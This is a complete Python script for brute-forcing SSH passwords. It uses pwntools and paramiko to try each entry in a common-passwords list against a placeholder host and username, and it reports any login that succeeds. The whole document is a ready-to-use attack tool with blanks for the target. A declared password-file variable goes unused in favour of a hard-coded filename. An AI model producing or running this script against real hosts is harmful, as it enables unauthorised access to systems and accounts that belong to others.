from pwn import *
import paramiko

# Replace the following placeholders with your specific values
host = "your_target_host_ip"
username = "your_target_username"
password_file_path = "path/to/your/password/file.txt"
attempts = 0

with open("ssh-common-passwords.txt", "r") as password_list:
    for password in password_list:
        password = password.strip("\n")
        try:
            print("[{}] Attempting password: '{}'!".format(attempts, password))
            response = ssh(host=host, user=username, password=password, timeout=1)
            if response.connected():
                print("[>] Valid password found: '{}'!".format(password))
                response.close()
                break

            response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print("[X] Invalid password!")
        attempts += 1
